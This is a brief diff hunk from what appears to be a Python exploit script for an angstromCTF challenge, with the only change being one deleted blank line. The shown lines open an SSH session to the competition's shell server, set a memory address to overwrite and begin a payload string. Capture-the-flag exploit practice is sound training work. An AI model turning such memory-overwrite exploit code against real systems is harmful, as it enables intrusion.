@@ -9,7 +9,6 @@ password = 'secret'
 
 shell = ssh(team_id, 'shell.angstromctf.com', password=password)
 
-
 addr_to_overwrite = 0x0804A030
 
 payload = "AAAA"
